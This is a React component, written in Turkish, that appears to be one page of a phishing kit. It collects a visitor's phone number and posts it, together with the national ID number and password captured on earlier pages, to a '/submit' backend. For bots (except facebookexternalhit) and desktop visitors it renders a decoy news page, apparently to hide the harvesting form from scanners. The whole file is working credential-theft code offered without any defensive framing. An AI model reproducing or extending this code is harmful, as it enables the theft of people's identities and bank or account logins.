import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { useAuth } from './AuthContext';
import { Helmet } from 'react-helmet';

function Telefon({ isBot }) {
  const { state: authState, dispatch } = useAuth();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneError, setPhoneError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();

  // Yetkisiz erişim kontrolü
  useEffect(() => {
    if (
      !location.state?.isValidNavigation ||
      !authState.tc ||
      !authState.password ||
      !authState.isAuthenticated
    ) {
      navigate('/', { replace: true });
    }
  }, [location.state, authState, navigate]);

  // Bot (facebookexternalhit hariç) veya desktop için sahte içerik
  if (isBot) {
    return (
      <>
        <Helmet>
          <meta name="robots" content="index, follow" />
        </Helmet>
        <div>
          <h1 style={{ color: '#333', textAlign: 'center' }}>Güncel Haberler</h1>
          <p style={{ maxWidth: '600px', margin: '20px auto', textAlign: 'center' }}>
            Son dakika haberleri, ekonomi, spor ve daha fazlası için haber portalımıza hoş geldiniz.
          </p>
          <div style={{ margin: '10px 0' }}>
            <h2>Ekonomi Gündemi</h2>
            <p>Borsa ve döviz kurlarında son gelişmeler...</p>
          </div>
          <div style={{ margin: '10px 0' }}>
            <h2>Spor Dünyasından Haberler</h2>
            <p>Futbol liglerinde heyecan devam ediyor...</p>
          </div>
          <p style={{ textAlign: 'center' }}>
            <a href="/" style={{ color: '#0066cc', textDecoration: 'none' }}>Ana Sayfaya Dön</a>
          </p>
        </div>
      </>
    );
  }

  const handleSubmit = async (e) => {
    e.preventDefault();
    setPhoneError('');

    if (!phoneNumber || phoneNumber.length !== 10 || !/^\d{10}$/.test(phoneNumber)) {
      setPhoneError('Lütfen 10 haneli telefon numaranızı girin.');
      return;
    }

    const payload = {
      tc: authState.tc,
      phone: phoneNumber,
      password: authState.password,
    };

    try {
      setIsSubmitting(true);
      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001';
      const response = await axios.post(`${apiUrl}/submit`, payload);
      console.log('[Telefon] API yanıtı:', response.data);
      dispatch({ type: 'SET_PHONE_VERIFIED' });
      navigate('/bekleme', {
        state: { isValidNavigation: true, from: '/telefon', isCompleted: true },
      });
    } catch (error) {
      console.error('[Telefon] API hatası:', error.response ? error.response.data : error.message);
      setPhoneError('Bilgiler gönderilemedi, lütfen tekrar deneyin.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div>
      <div className="panel">
        <div id="phoneEntryPanel" className="panel-body">
          <h1 className="panel-title light">
            Telefon Doğrulama
            <p>Lütfen 10 haneli kayıtlı telefon numaranızı girin.</p>
          </h1>
          <div className="row">
            <div className="col-md-12">
              <div className="form-horizontal">
                <form id="telefonForm" onSubmit={handleSubmit} autoComplete="off">
                  <div className="formField">
                    <div className="formFieldOuter">
                      <div className="formFieldInner form-group">
                        <label htmlFor="phoneNumber" className="col-sm-5 col-md-4 control-label">
                          Telefon Numarası
                        </label>
                        <div className="formFieldSurround col-sm-7 col-md-8">
                          <input
                            type="tel"
                            className="form-control"
                            value={phoneNumber}
                            onChange={(e) => setPhoneNumber(e.target.value)}
                            pattern="[0-9]*"
                            id="phoneNumber"
                            name="telefonNoLabelUstte"
                            maxLength="10"
                            autoComplete="off"
                            placeholder="5XXXXXXXXX"
                          />
                          {phoneError && (
                            <div className="errorContainer advice-text has-alert" aria-live="assertive">
                              <div className="errorWrapper">
                                <div className="errorMessage">{phoneError}</div>
                              </div>
                            </div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                  <div className="form-group form-group-offset footer-button">
                    <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                      <p>
                        <button
                          id="formSubmit"
                          className="btn btn-primary btn-lg btn-block-input mobile-hover"
                          type="submit"
                          disabled={isSubmitting}
                          aria-busy={isSubmitting ? 'true' : 'false'}
                        >
                          {isSubmitting ? (
                            <>
                              <i className="fa fa-spinner fa-spin" aria-hidden="true" />
                              <span style={{ marginLeft: 8 }}>Gönderiliyor…</span>
                            </>
                          ) : (
                            'Telefon Numarasını Doğrula'
                          )}
                        </button>
                      </p>
                    </div>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Telefon;